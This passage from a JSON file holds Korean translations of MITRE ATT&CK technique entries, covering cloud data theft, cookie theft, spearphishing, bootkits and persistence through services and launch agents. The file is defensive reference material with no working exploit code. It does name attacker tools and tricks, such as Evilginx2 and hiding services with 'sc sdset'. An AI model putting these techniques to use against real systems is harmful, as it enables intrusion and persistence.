      "description": "적대자는 클라우드 스토리지에서 데이터를 접근할 수 있습니다.\n\n많은 IaaS 공급자는 Amazon S3, Azure Storage 및 Google Cloud Storage와 같은 온라인 데이터 객체 스토리지 솔루션을 제공합니다. 비슷하게, Office 365 및 Google Workspace와 같은 SaaS 기업 플랫폼은 OneDrive 및 Google Drive와 같은 서비스를 통해 사용자에게 클라우드 기반 문서 저장소를 제공합니다. 또한 Slack, Confluence, Salesforce 및 Dropbox와 같은 SaaS 애플리케이션 제공자는 클라우드 스토리지 솔루션을 플랫폼의 부가적 또는 주요 용도로 제공할 수 있습니다.\n\n일부 경우, IaaS 기반 클라우드 스토리지와 같이 저장된 객체와 상호작용할 수 있는 전반적인 애플리케이션(예: SQL 또는 Elasticsearch)이 존재하지 않습니다. 대신 이러한 솔루션의 데이터는 [클라우드 API](https://attack.mitre.org/techniques/T1059/009)를 통해 직접 검색됩니다. SaaS 애플리케이션에서는 적대자가 API나 백엔드 클라우드 스토리지 객체에서 직접 데이터를 수집할 수 있으며, 이는 프론트엔드 애플리케이션이나 인터페이스를 통해서가 아닙니다(즉, [정보 저장소에서 데이터 수집](https://attack.mitre.org/techniques/T1213)).\n\n적대자는 이러한 클라우드 스토리지 솔루션에서 민감한 데이터를 수집할 수 있습니다. 공급자는 일반적으로 최종 사용자가 시스템을 구성하는 데 도움을 주기 위한 보안 가이드를 제공하지만, 잘못된 구성은 일반적인 문제입니다. (인용: Amazon S3 보안, 2019)(인용: Microsoft Azure Storage 보안, 2019)(인용: Google Cloud Storage 모범 사례, 2019) 클라우드 스토리지가 잘못 보호된 사례가 수없이 발생했으며, 일반적으로 인증되지 않은 사용자에게 무작위로 공개 엑세스를 허용하거나, 모든 사용자에게 지나치게 광범위한 엑세스를 허용하거나, 심지어 기본 사용자 권한이 필요 없는 신원 액세스 관리 시스템의 제어 밖에 있는 익명의 개인에게도 엑세스를 허용한 경우가 많습니다.\n\n이러한 개방된 엑세스는 신용 카드, 개인 식별 정보 또는 의료 기록과 같은 다양한 유형의 민감한 데이터를 노출시킬 수 있습니다. (인용: Trend Micro S3 노출된 PII, 2017)(인용: Wired Magecart S3 버킷, 2019)(인용: HIPAA 저널 S3 유출, 2017)(인용: Rclone-mega-extortion_05_2021)\n\n적대자는 소스 저장소, 로그 또는 다른 방법을 통해 유출된 자격 증명을 획득한 후 이를 악용하여 클라우드 스토리지 객체에 접근할 수 있습니다.",
      "external_id": "T1530",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Data from Cloud Storage",
      "translated": true
    },
    {
      "description": "적대 세력은 합법적인 사용자가 사용하는 계정에 대한 접근을 방해하여 시스템 및 네트워크 자원의 가용성을 중단할 수 있습니다. 계정은 삭제되거나 잠기거나 조작될 수 있으며(예: 자격 증명 변경) 이를 통해 계정 접근을 제거할 수 있습니다. 이후 적대 세력은 로그오프를 수행하거나 악성 변경 사항을 적용하기 위해 [시스템 종료/재부팅](https://attack.mitre.org/techniques/T1529)을 실행할 수 있습니다. (인용: CarbonBlack LockerGoga 2019)(인용: Unit42 LockerGoga 2019)\n\nWindows에서는 [Net](https://attack.mitre.org/software/S0039) 유틸리티, <code>Set-LocalUser</code> 및 <code>Set-ADAccountPassword</code> [파워셸](https://attack.mitre.org/techniques/T1059/001) cmdlet이 적대 세력에 의해 사용자 계정을 수정하는 데 사용될 수 있습니다. Linux에서는 <code>passwd</code> 유틸리티를 사용하여 비밀번호를 변경할 수 있습니다. 계정은 그룹 정책에 의해 비활성화될 수도 있습니다.\n\n랜섬웨어 또는 유사한 공격을 사용하는 적대 세력은 먼저 이러한 영향 행동(예: [데이터 파괴](https://attack.mitre.org/techniques/T1485) 및 [변조](https://attack.mitre.org/techniques/T1491))을 수행하여 사고 대응/복구를 방해한 후, [영향을 위한 데이터 암호화](https://attack.mitre.org/techniques/T1486) 목표를 완료할 수 있습니다.",
      "external_id": "T1531",
      "modified": "2024-10-15T15:35:13.577Z",
      "title": "Account Access Removal",
      "translated": true
    },
    {
      "description": "그들은 이미 환경 내의 계정이나 시스템에 접근한 후, 내부 스피어 피싱(internal spearphishing)을 사용하여 추가 정보를 획득하거나 동일 조직 내의 다른 사용자를 타겟으로 삼을 수 있습니다. 내부 스피어 피싱은 다단계 캠페인으로, 정당한 계정이 사용자 기기를 제어하거나 사용자 계정 자격 증명을 탈취함으로써 처음에 compromised 됩니다. 이후 적대자는 신뢰받는 내부 계정을 활용하여 더 많은 피해자를 피싱 시도로 속일 가능성을 높이려 할 수 있으며, 종종 [사칭(Impersonation)](https://attack.mitre.org/techniques/T1656)을 포함 시킵니다. (인용: Trend Micro - Int SP)\n\n예를 들어, 적대자는 내부 스피어 피싱의 일환으로 [스피어피싱 첨부파일(Spearphishing Attachment)](https://attack.mitre.org/techniques/T1566/001) 또는 [스피어피싱 링크(Spearphishing Link)](https://attack.mitre.org/techniques/T1566/002)를 이용하여 페이로드를 전달하거나 외부 사이트로 리다이렉트하여 로그인 인터페이스를 모방한 사이트에서 [입력 캡처(Input Capture)](https://attack.mitre.org/techniques/T1056)를 통해 자격 증명을 탈취할 수 있습니다.\n\n적대자는 또한 Microsoft Teams와 같은 내부 채팅 애플리케이션을 활용하여 악성 콘텐츠를 퍼뜨리거나 사용자를 유인하여 민감한 정보 및/또는 자격 증명을 캡처하려고 시도할 수 있습니다. (인용: Int SP - 채팅 애플리케이션)",
      "external_id": "T1534",
      "modified": "2024-10-15T15:59:36.741Z",
      "title": "Internal Spearphishing",
      "translated": true
    },
    {
      "description": "적대 세력은 탐지를 피하기 위해 사용되지 않는 지리적 서비스 지역에 클라우드 인스턴스를 생성할 수 있습니다. 일반적으로 클라우드 인프라를 관리하는 데 사용되는 계정을 침해하여 접근합니다.\n\n클라우드 서비스 제공업체는 성능을 개선하고 중복성을 제공하며 고객이 준수 요구 사항을 충족할 수 있도록 전 세계에 걸쳐 인프라를 제공합니다. 종종 고객은 사용 가능한 지역의 일부만 활용하고 다른 지역을 적극적으로 모니터링하지 않을 수 있습니다. 적대 세력이 사용되지 않는 지역에 자원을 생성하면 탐지되지 않고 작동할 수 있습니다.\n\n이러한 행동의 변형은 클라우드 지역 간 기능의 차이를 이용합니다. 적대 세력은 고급 탐지 서비스를 지원하지 않는 지역을 활용하여 활동이 탐지되는 것을 피할 수 있습니다.\n\n사용되지 않는 AWS 지역을 사용하는 적대 세력의 예로는 [자원 탈취](https://attack.mitre.org/techniques/T1496)를 통해 암호화폐를 채굴하는 것이 있습니다. 이는 사용되는 처리 능력에 따라 시간이 지남에 따라 조직에 상당한 금전적 손실을 초래할 수 있습니다. (출처: CloudSploit - 사용되지 않는 AWS 지역)",
      "external_id": "T1535",
      "modified": "2023-12-14T16:28:24.680Z",
      "title": "Unused/Unsupported Cloud Regions",
      "translated": true
    },
    {
      "description": "공격자는 악의적인 활동을 수행한 후 클라우드 인스턴스에서 변경된 사항을 되돌리려 할 수 있으며, 이를 통해 탐지를 피하고 자신이 존재했다는 증거를 제거하려고 합니다. 클라우드 기반 인프라와 같은 고도로 가상화된 환경에서는 클라우드 관리 대시보드 또는 클라우드 API를 통해 가상 머신(VM) 또는 데이터 저장소 스냅샷을 복원함으로써 이 작업을 수행할 수 있습니다.\n\n이 기술의 또 다른 변형은 컴퓨팅 인스턴스에 연결된 임시 저장소를 활용하는 것입니다. 대부분의 클라우드 제공업체는 지속적, 로컬 및/또는 일시적 유형을 포함한 다양한 유형의 저장소를 제공하며, 일시적 유형은 VM을 중지/재시작할 때 종종 초기화됩니다. (출처: Tech Republic - AWS 스냅샷 복원) (출처: Google - 클라우드 스냅샷 복원)",
      "external_id": "T1536",
      "modified": "2021-03-08T10:33:01.527Z",
      "title": "Revert Cloud Instance",
      "translated": true
    },
    {
      "description": "공격자는 데이터를 유출할 수 있으며, 이는 클라우드 환경의 데이터를 공유/동기화하거나 백업을 생성하여 자신이 통제하는 동일한 서비스의 다른 클라우드 계정으로 전송하는 방식으로 이루어질 수 있습니다.\n\n방어자는 정상적인 파일 전송이나 명령 및 제어 채널을 통한 클라우드 환경 외부로의 대량 전송을 모니터링하고 있을 수 있지만, 동일한 클라우드 제공업체 내의 다른 계정으로의 데이터 전송은 감시하지 않을 수 있습니다. 이러한 전송은 기존 클라우드 제공업체 API 및 클라우드 제공업체의 내부 주소 공간을 활용하여 정상 트래픽에 혼합되거나 외부 네트워크 인터페이스를 통한 데이터 전송을 회피할 수 있습니다. (인용: TLDRSec AWS Attacks)\n\n또한 공격자는 익명 파일 공유 링크를 생성하거나 Azure의 경우 공유 액세스 서명(SAS) URI와 같은 클라우드 네이티브 메커니즘을 사용하여 피해자의 데이터를 적대적인 제어 클라우드 계정과 공유할 수 있습니다. (인용: Microsoft Azure Storage Shared Access Signature)\n\n사건들이 관찰된 바에 따르면, 공격자들은 클라우드 인스턴스의 백업을 생성하고 이를 별도의 계정으로 전송한 사례가 있습니다. (인용: DOJ GRU 기소장 2018년 7월)",
      "external_id": "T1537",
      "modified": "2024-10-15T16:08:25.344Z",
      "title": "Transfer Data to Cloud Account",
      "translated": true
    },
    {
      "description": "적대자는 도난당한 자격 증명을 사용하여 클라우드 서비스 대시보드 GUI에 접근함으로써 운영 클라우드 환경에서 특정 서비스, 자원 및 기능과 같은 유용한 정보를 얻을 수 있습니다. 예를 들어, GCP 명령 센터를 사용하면 모든 자산과 잠재적인 보안 위험의 발견 사항, 공개 IP 주소 및 열린 포트 검색과 같은 추가 쿼리를 실행할 수 있습니다. (출처: Google Command Center Dashboard)\n\n환경의 설정에 따라, 적대자는 그래픽 대시보드를 통해 API보다 더 많은 정보를 열거할 수 있을 수도 있습니다. 이는 적대자가 API 요청을 하지 않고도 정보를 얻을 수 있게 해줍니다.",
      "external_id": "T1538",
      "modified": "2024-10-15T15:51:56.279Z",
      "title": "Cloud Service Dashboard",
      "translated": true
    },
    {
      "description": "적대자는 웹 애플리케이션이나 서비스의 세션 쿠키를 훔쳐 이를 이용해 자격 증명 없이 인증된 사용자로서 웹 애플리케이션이나 인터넷 서비스에 접근할 수 있습니다. 웹 애플리케이션과 서비스는 종종 사용자가 웹사이트에 인증한 후 인증 토큰으로 세션 쿠키를 사용합니다.\n\n쿠키는 웹 애플리케이션이 적극적으로 사용되지 않더라도 오랜 기간 동안 유효할 수 있습니다. 쿠키는 디스크에, 브라우저의 프로세스 메모리에, 원격 시스템으로의 네트워크 트래픽에 있을 수 있습니다. 또한, 타겟 머신의 다른 애플리케이션이 민감한 인증 쿠키를 메모리 내에 저장할 수도 있습니다(예: 클라우드 서비스에 인증하는 앱 등). 세션 쿠키는 일부 다단계 인증 프로토콜을 우회하는 데 사용될 수 있습니다. (출처: Pass The Cookie)\n\n로컬 시스템의 웹 브라우저에서 쿠키를 대상으로 하는 여러 종류의 악성 소프트웨어의 예가 있습니다. (출처: Kaspersky TajMahal 2019년 4월)(출처: Unit 42 Mac Crypto Cookies 2019년 1월) 적대자는 또한 악성 JavaScript 콘텐츠를 웹사이트에 주입하거나 [사용자 실행](https://attack.mitre.org/techniques/T1204)을 이용해 피해자가 브라우저에서 악성 JavaScript를 실행하도록 속임으로써 쿠키를 훔칠 수 있습니다. (출처: Talos Roblox Scam 2023)(출처: Krebs Discord Bookmarks 2023)\n\n또한, `Evilginx2`와 `Muraena`와 같은 오픈 소스 프레임워크가 있으며, 이는 적대자가 설정하고 피싱 캠페인에 사용할 수 있는 악성 프록시를 통해 세션 쿠키를 수집할 수 있습니다. (출처: Github evilginx2)(출처: GitHub Mauraena)\n\n적대자가 유효한 쿠키를 획득한 후에는 해당 웹 애플리케이션에 로그인하기 위해 [웹 세션 쿠키](https://attack.mitre.org/techniques/T1550/004) 기법을 수행할 수 있습니다.",
      "external_id": "T1539",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Steal Web Session Cookie",
      "translated": true
    },
    {
      "description": "공격자는 시스템에 지속성을 확립하기 위한 방법으로 Pre-OS 부팅 메커니즘을 악용할 수 있습니다. 컴퓨터의 부팅 과정 동안, 펌웨어와 다양한 시작 서비스가 운영 체제보다 먼저 로드됩니다. 이러한 프로그램은 운영 체제가 제어를 잡기 전에 실행 흐름을 제어합니다. (출처: Wikipedia 부팅)\n\n공격자는 시스템의 운영 체제 아래의 계층에서 지속성을 유지하기 위해 BIOS(기본 입출력 시스템) 및 통합 확장 펌웨어 인터페이스(UEFI)와 같은 부팅 드라이버 또는 펌웨어의 데이터를 덮어쓸 수 있습니다. 이 수준의 맬웨어는 호스트 소프트웨어 기반 방어수단에 의해 탐지되지 않기 때문에 특히 탐지하기 어려울 수 있습니다.",
      "external_id": "T1542",
      "modified": "2024-02-26T14:26:14.364Z",
      "title": "Pre-OS Boot",
      "translated": true
    },
    {
      "description": "적대적인 공격자는 시스템 펌웨어를 수정하여 시스템에서 지속적으로 존재할 수 있습니다. BIOS(기본 입출력 시스템)와 통합 확장 펌웨어 인터페이스(UEFI) 또는 확장 펌웨어 인터페이스(EFI)는 운영 체제와 컴퓨터 하드웨어 간의 소프트웨어 인터페이스로 작동하는 시스템 펌웨어의 예시입니다.(출처: Wikipedia BIOS)(출처: Wikipedia UEFI)(출처: About UEFI)\n\nBIOS 및 (U)EFI와 같은 시스템 펌웨어는 컴퓨터의 기능적 기초를 이루며, 공격자가 악의적인 활동을 수행하거나 이를 지원하기 위해 수정할 수 있습니다. 시스템 펌웨어를 덮어쓸 수 있는 기능이 존재하여, 정교한 공격자는 악성 펌웨어 업데이트를 설치하는 수단으로 활용할 수 있으며, 이는 시스템에서 지속적으로 존재하기 위해 탐지가 어려울 수 있습니다.",
      "external_id": "T1542.001",
      "modified": "2024-04-16T12:21:51.311Z",
      "title": "System Firmware",
      "translated": true
    },
    {
      "description": "적대적인 행위자는 시스템에 지속성을 유지하기 위해 구성 요소 펌웨어를 수정할 수 있습니다. 일부 적대자는 컴퓨터 구성 요소를 타겟으로 삼아 악성 펌웨어를 설치하고, 이를 통해 운영 체제 및 주요 시스템 펌웨어 또는 BIOS 외부에서 적대적인 코드를 실행하기 위해 정교한 방법을 사용할 수 있습니다. 이 기술은 [시스템 펌웨어](https://attack.mitre.org/techniques/T1542/001)와 유사할 수 있지만, 같은 능력이나 무결성 검사를 유지하지 않는 다른 시스템 구성 요소/장치에 대해 수행될 수 있습니다.\n\n악성 구성 요소 펌웨어는 하드 디스크 재구성 및 접근 유지 실패와 같은 전형적인 문제에도 불구하고 시스템에 대한 지속적인 접근을 제공할 수 있으며, 호스트 소프트웨어 기반 방어 시스템 및 무결성 검사를 회피하는 방법을 제공할 수 있습니다.",
      "external_id": "T1542.002",
      "modified": "2022-04-01T20:43:55.632Z",
      "title": "Component Firmware",
      "translated": true
    },
    {
      "description": "적대자는 시스템에 지속적으로 존재하기 위해 부트킷(bootkit)을 사용할 수 있습니다. 부트킷은 운영 체제 아래의 레이어에 존재하며, 조직이 부트킷이 사용되었다고 의심하고 적절히 조치를 취하지 않는 한 전체 복구를 수행하기 어렵게 만들 수 있습니다.\n\n부트킷은 하드 드라이브의 부트 섹터를 수정하는 악성코드 변종으로, 마스터 부트 레코드(MBR)와 볼륨 부트 레코드(VBR)를 포함합니다. (출처: Mandiant M Trends 2016) MBR은 BIOS에 의해 하드웨어 초기화를 완료한 후 처음으로 로드되는 디스크의 섹션으로, 부트 로더의 위치입니다. 적대자가 부트 드라이브에 원시 액세스 권한을 가지고 있다면 이 영역을 덮어씌워 정상 부트 로더 대신 적대자 코드로 시작 시 실행을 전환할 수 있습니다. (출처: Lau 2011)\n\nMBR은 부팅 프로세스의 제어를 VBR에 전달합니다. MBR의 경우와 유사하게, 적대자가 부트 드라이브에 원시 액세스 권한을 가지고 있다면 VBR을 덮어씌워 시작 시 적대자 코드로 실행을 전환할 수 있습니다.",
      "external_id": "T1542.003",
      "modified": "2023-03-30T21:01:47.417Z",
      "title": "Bootkit",
      "translated": true
    },
    {
      "description": "적대 세력은 ROM 모니터(ROMMON)를 악용하여 허가되지 않은 펌웨어와 적대 코드로 로드하여 지속적인 접근을 제공하고 장치의 동작을 조작할 수 있습니다. 이는 탐지가 어렵습니다. (인용: Cisco Synful Knock Evolution)(인용: Cisco Blog Legacy Device Attacks)\n\nROMMON은 Cisco 네트워크 장치의 펌웨어로, 부트로더, 부트 이미지 또는 부트 헬퍼로 기능하며, 플랫폼이 전원이 켜지거나 재설정될 때 하드웨어와 소프트웨어를 초기화합니다. [TFTP 부팅](https://attack.mitre.org/techniques/T1542/005)과 유사하게, 적대 세력은 ROMMON 이미지를 로컬 또는 원격으로(예: TFTP를 통해) 적대 코드로 업그레이드하고 장치를 재시작하여 기존 ROMMON 이미지를 덮어쓸 수 있습니다. 이는 적대 세력이 시스템에서 지속성을 확보할 수 있는 수단을 제공하며, 탐지가 어려운 방식으로 이루어질 수 있습니다.",
      "external_id": "T1542.004",
      "modified": "2020-10-22T02:18:19.568Z",
      "title": "ROMMONkit",
      "translated": true
    },
    {
      "description": "적대적인 공격자는 네트워크 부팅(netbooting)을 악용하여 Trivial File Transfer Protocol(TFTP) 서버에서 허가되지 않은 네트워크 장치 운영 체제를 로드할 수 있습니다. TFTP 부팅(네트워크 부팅)은 일반적으로 네트워크 관리자들이 중앙 관리 서버에서 구성 제어된 네트워크 장치 이미지를 로드하는데 사용됩니다. 네트워크 부팅은 부팅 시퀀스의 한 옵션으로, 장치 이미지를 중앙에서 집중 관리 및 제어하는 데 사용될 수 있습니다.\n\n적대적인 공격자는 네트워크 장치의 구성을 조작하여 악성 TFTP 서버를 사용하도록 지정할 수 있으며, 이는 [시스템 이미지 수정](https://attack.mitre.org/techniques/T1601)과 결합되어 장치 시작 또는 리셋 시 수정된 이미지를 로드하는 데 사용될 수 있습니다. 허가되지 않은 이미지는 공격자가 장치 구성 변경, 장치에 악성 기능 추가, 그리고 표준 기능을 통해 탐지를 최소화하면서 네트워크 장치에 대한 제어를 유지할 수 있는 백도어를 도입할 수 있게 합니다. 이 기법은 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)과 유사하며, 네트워크 장치에서 수정된 이미지가 실행될 수 있습니다. (출처: Cisco 블로그 유산 장치 공격)",
      "external_id": "T1542.005",
      "modified": "2020-10-22T16:35:53.806Z",
      "title": "TFTP Boot",
      "translated": true
    },
    {
      "description": "공격자들은 지속성을 확보하기 위해 악성 페이로드를 반복적으로 실행하도록 시스템 수준 프로세스를 생성하거나 수정할 수 있습니다. 운영 체제가 부팅될 때, 백그라운드 시스템 기능을 수행하는 프로세스가 시작될 수 있습니다. Windows와 Linux에서는 이러한 시스템 프로세스를 서비스라고 합니다. (출처: TechNet Services) macOS에서는 시스템 초기화를 완료하고 사용자별 매개변수를 로드하기 위해 launchd 프로세스인 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)과 [Launch Agent](https://attack.mitre.org/techniques/T1543/001)가 실행됩니다. (출처: AppleDocs Launch Agent Daemons)\n\n공격자들은 시작 시 또는 반복 가능한 간격에 실행되도록 구성할 수 있는 새로운 서비스, 데몬 또는 에이전트를 설치하여 지속성을 구축할 수 있습니다. 유사하게, 공격자들은 기존의 서비스, 데몬 또는 에이전트를 수정하여 동일한 효과를 얻을 수 있습니다.\n\n서비스, 데몬 또는 에이전트는 관리자 권한으로 생성되지만 root/SYSTEM 권한으로 실행될 수 있습니다. 공격자들은 이 기능을 활용하여 시스템 프로세스를 생성하거나 수정하여 권한을 상승시킬 수 있습니다. (출처: OSX Malware Detection)",
      "external_id": "T1543",
      "modified": "2024-02-15T14:14:03.942Z",
      "title": "Create or Modify System Process",
      "translated": true
    },
    {
      "description": "적대자들은 지속성을 위해 악성 페이로드를 반복적으로 실행하기 위해 발생 에이전트를 생성하거나 수정할 수 있습니다. 사용자가 로그인하면, 로그인할 때마다 각 사용자 요청 에이전트의 매개변수를 로드하는 사용자별 launchd 프로세스가 시작됩니다. 이 매개변수는 <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, 및 <code>~/Library/LaunchAgents</code>에 있는 속성 목록(.plist) 파일에서 찾을 수 있습니다. (출처: AppleDocs Launch Agent Daemons)(출처: OSX Keydnap 악성코드) (출처: 구식 Mac 악성코드) 속성 목록 파일은 <code>Label</code>, <code>ProgramArguments</code>, 및 <code>RunAtLoad</code> 키를 사용하여 Launch Agent의 이름, 실행 파일 위치, 및 실행 시간을 식별합니다. (출처: OSX.Dok 악성코드) Launch Agents는 종종 프로그램 업데이트를 수행하거나, 로그인 시 사용자 지정 프로그램을 실행하거나, 기타 개발자 작업을 수행하기 위해 설치됩니다.\n\nLaunch Agents는 [Launchctl](https://attack.mitre.org/techniques/T1569/001) 명령어를 사용하여 실행될 수도 있습니다.\n\n적대자들은 <code>RunAtLoad</code> 또는 <code>KeepAlive</code> 키가 <code>true</code>로 설정된 .plist 파일을 적절한 폴더에 배치하여 로그인 시 실행되는 새로운 Launch Agent를 설치할 수 있습니다. (출처: Sofacy Komplex 트로이목마)(출처: Mac 악성코드 지속성 방법) Launch Agent의 이름은 관련 운영 체제나 무해한 소프트웨어의 이름을 사용하여 위장할 수 있습니다. Launch Agents는 사용자 수준 권한으로 생성되며 사용자 수준 권한으로 실행됩니다. (출처: OSX 악성코드 탐지)(출처: OceanLotus for OS X)",
      "external_id": "T1543.001",
      "modified": "2022-04-21T16:13:00.598Z",
      "title": "Launch Agent",
      "translated": true
    },
    {
      "description": "공격자들은 지속성을 위해 악성 페이로드를 반복적으로 실행하기 위해 systemd 서비스를 생성하거나 수정할 수 있습니다. systemd는 백그라운드 데몬 프로세스(서비스라고도 함) 및 기타 시스템 리소스를 관리하는 데 일반적으로 사용되는 시스템 및 서비스 관리자입니다. (참고: Linux man-pages: systemd 2014년 1월) systemd는 많은 리눅스 배포판의 기본 초기화(init) 시스템으로, 기존의 init 시스템인 SysVinit 및 Upstart를 대체하면서도 역호환성을 유지합니다.\n\nsystemd는 서비스를 프로세스에 대한 정보를 인코딩하기 위해 `.service` 파일 확장자를 가진 단위 구성 파일을 활용합니다. 기본적으로 시스템 수준의 단위 파일은 루트가 소유한 디렉터리(`/`)의 `/systemd/system` 디렉터리에 저장됩니다. 사용자 수준의 단위 파일은 사용자 소유의 디렉터리(`$HOME`)의 `/systemd/user` 디렉터리에 저장됩니다. (참고: lambert systemd 2022)\n\n`.service` 단위 파일 내부에서는 다음과 같은 지시어로 명령을 실행합니다. (참고: freedesktop systemd.service)\n\n* `ExecStart`, `ExecStartPre`, 및 `ExecStartPost` 지시어는 사용자가 `systemctl`로 수동으로 서비스를 시작하거나 서비스가 자동으로 시작하도록 설정된 경우 시스템 시작 시 실행됩니다.\n* `ExecReload` 지시어는 서비스가 재시작될 때 실행됩니다. \n* `ExecStop`, `ExecStopPre`, 및 `ExecStopPost` 지시어는 서비스가 중지될 때 실행됩니다.\n\n공격자들은 새로운 서비스 파일을 생성하고, `.service` 파일의 지시어가 실행하는 명령을 변경하며, `.service` 파일이 실행되는 사용자 지시어를 수정하여 특권 상승을 초래할 수 있습니다. 공격자들은 또한 이러한 디렉터리에 심볼릭 링크를 배치하여 systemd가 파일 시스템의 위치와 관계없이 이러한 페이로드를 찾을 수 있게 할 수 있습니다. (참고: Anomali Rocke 2019년 3월)(참고: airwalk 백도어 유닉스 시스템)(참고: Rapid7 서비스 지속성 2016년 6월 22일)\n\n`.service` 파일의 사용자 지시어는 특정 사용자로 서비스를 실행하는 데 사용될 수 있으며, 이는 특정 사용자/그룹 권한에 따라 특권 상승을 초래할 수 있습니다.",
      "external_id": "T1543.002",
      "modified": "2024-02-15T14:19:22.282Z",
      "title": "Systemd Service",
      "translated": true
    },
    {
      "description": "적대 세력은 지속성을 유지하기 위해 악성 페이로드를 반복적으로 실행하도록 Windows 서비스를 생성하거나 수정할 수 있습니다. Windows가 부팅되면 시스템의 백그라운드 기능을 수행하는 프로그램 또는 애플리케이션인 서비스를 시작합니다. (출처: TechNet Services) Windows 서비스 구성 정보, 즉 서비스 실행 파일의 경로 또는 복구 프로그램/명령어는 Windows 레지스트리에 저장됩니다.\n\n적대 세력은 시스템에서 지속성을 유지하기 위해 새 서비스를 설치하거나 기존 서비스를 수정하여 시작 시 실행되도록 할 수 있습니다. 서비스 구성은 시스템 유틸리티(예: sc.exe)를 사용하거나 직접 레지스트리를 수정하거나 Windows API와 직접 상호작용하여 설정하거나 수정할 수 있습니다.\n\n또한, 적대 세력은 서비스를 사용하여 악성 드라이버를 설치하고 실행할 수도 있습니다. 예를 들어, 드라이버 파일(예: `.sys`)을 디스크에 배치한 후, 페이로드는 필요한 서비스 레지스트리 값을 생성하거나 [네이티브 API](https://attack.mitre.org/techniques/T1106) 함수인 `CreateServiceW()`를 통해 로드하고 등록될 수 있으며(또는 `ZwLoadDriver()` 및 `ZwSetValueKey()`와 같은 함수를 통해 수동으로 수행할 수도 있음), 또는 `PnPUtil.exe`와 같은 명령줄 유틸리티를 사용할 수 있습니다. (출처: Symantec W.32 Stuxnet Dossier)(출처: Crowdstrike DriveSlayer 2022년 2월)(출처: Unit42 AcidBox 2020년 6월) 적대 세력은 이러한 드라이버를 [루트킷](https://attack.mitre.org/techniques/T1014)으로 활용하여 시스템에서 악성 활동의 존재를 숨길 수 있습니다. 또한, 적대 세력은 [특권 상승을 위한 익스플로잇](https://attack.mitre.org/techniques/T1068)의 일환으로 서명되었지만 취약한 드라이버를 손상된 머신에 로드하는 \"자신의 취약한 드라이버 가져오기\"(BYOVD)를 사용할 수도 있습니다. (출처: ESET InvisiMole 2020년 6월)(출처: Unit42 AcidBox 2020년 6월)\n\n서비스는 관리자 권한으로 생성될 수 있지만, SYSTEM 권한으로 실행되므로 적대 세력은 서비스를 사용하여 권한을 상승시킬 수도 있습니다. 또한, 적대 세력은 [서비스 실행](https://attack.mitre.org/techniques/T1569/002)을 통해 서비스를 직접 시작할 수 있습니다.\n\n탐지를 더욱 어렵게 만들기 위해, 악성 서비스는 [가짜 작업 또는 서비스](https://attack.mitre.org/techniques/T1036/004)를 통합하여(예: 합법적인 OS 또는 양성 소프트웨어 구성 요소와 관련된 서비스 및/또는 페이로드 이름 사용) 만들어질 수 있습니다. 적대 세력은 또한 `sc sdset` 명령을 사용하여 서비스 권한을 서비스 설명 언어(SDDL)를 통해 설정함으로써 '숨겨진' 서비스를 생성할 수 있습니다. 이는 표준 서비스 열거 방법인 `Get-Service`, `sc query`, 및 `services.exe`에서 Windows 서비스의 표시를 숨길 수 있습니다. (출처: SANS 1)(출처: SANS 2)",
      "external_id": "T1543.003",
      "modified": "2024-04-11T19:25:51.394Z",
      "title": "Windows Service",
      "translated": true
    },
    {
      "description": "적대자는 지속성을 유지하기 위해 악성 페이로드를 실행하기 위해 Launch Daemon을 생성하거나 수정할 수 있습니다. Launch Daemon은 macOS에서 사용되는 서비스 관리 프레임워크인 Launchd와 상호작용하는 데 사용되는 plist 파일입니다. Launch Daemon은 설치를 위해 관리자 권한이 필요하며, 로그인 전에 시스템의 모든 사용자에 대해 실행되고, 사용자 상호작용 없이 백그라운드에서 실행됩니다. macOS 초기화 시작 중에, launchd 프로세스는 <code>/System/Library/LaunchDaemons/</code> 및 <code>/Library/LaunchDaemons/</code>에서 발견된 plist 파일로부터 온디맨드 시스템 수준의 Daemon에 대한 매개 변수를 로드합니다. 필요한 Launch Daemon 매개 변수에는 작업을 식별하기 위한 <code>Label</code>, 실행 파일 경로를 제공하기 위한 <code>Program</code> 및 작업이 실행되는 시점을 지정하기 위한 <code>RunAtLoad</code>가 포함됩니다. Launch Daemon은 종종 공유 리소스에 대한 접근을 제공하거나 소프트웨어 업데이트를 수행하거나 자동화 작업을 수행하는 데 사용됩니다. (출처: AppleDocs Launch Agent Daemons) (출처: Mac 악성코드 지속성 방법) (출처: plist용 launchd 키워드)\n\n적대자는 <code>RunAtLoad</code> 매개 변수를 <code>true</code>로 설정하고 <code>Program</code> 매개 변수를 악성 실행 파일 경로로 설정하여 시작 시 실행되도록 구성된 Launch Daemon을 설치할 수 있습니다. Daemon 이름은 관련 운영 체제 또는 무해한 소프트웨어의 이름을 사용하여 위장할 수 있습니다 (즉, [위장](https://attack.mitre.org/techniques/T1036)). Launch Daemon이 실행될 때, 프로그램은 관리 권한을 상속받습니다. (출처: WireLurker) (출처: OSX 악성코드 탐지)\n\n또한, 시스템 구성 변경(예: 서드파티 패키지 관리 소프트웨어 설치)은 <code>usr/local/bin</code>과 같은 폴더를 전 세계적으로 쓰기 가능하게 만들 수 있습니다. 따라서 잘못된 구성으로 인해 적대자가 현재 Launch Daemon의 plist 파일에서 참조된 실행 파일을 수정할 수 있는 가능성이 있습니다. (출처: LaunchDaemon Hijacking) (출처: sentinelone macos persist Jun 2019)",
      "external_id": "T1543.004",
      "modified": "2023-03-30T21:01:48.453Z",
      "title": "Launch Daemon",
      "translated": true
    },
    {
      "description": "적대자는 개별 호스트에서 데몬, 에이전트 또는 서비스로 실행되는 컨테이너 또는 컨테이너 클러스터 관리 도구를 생성하거나 수정할 수 있습니다. 여기에는 Docker 및 Podman과 같은 개별 컨테이너를 생성하고 관리하는 소프트웨어와 kubelet과 같은 컨테이너 클러스터 노드 수준 에이전트가 포함됩니다. 이러한 서비스를 수정함으로써 적대자는 호스트에서 지속성을 확보하거나 권한 상승을 달성할 수 있습니다.\n\n예를 들어, `docker run` 또는 `podman run` 명령어에 `restart=always` 지시어를 사용함으로써 컨테이너는 호스트에서 지속적으로 재시작되도록 구성할 수 있습니다. (출처: AquaSec TeamTNT 2023) (root 권한) docker 명령어에 접근할 수 있는 사용자는 호스트에서 권한 상승을 할 수 있습니다. (출처: GTFOBins Docker)\n\nKubernetes 환경에서는 DaemonSet을 통해 적대자가 모든 노드에 지속적으로 [컨테이너 배포](https://attack.mitre.org/techniques/T1610)를 할 수 있으며, 이후 클러스터에 추가된 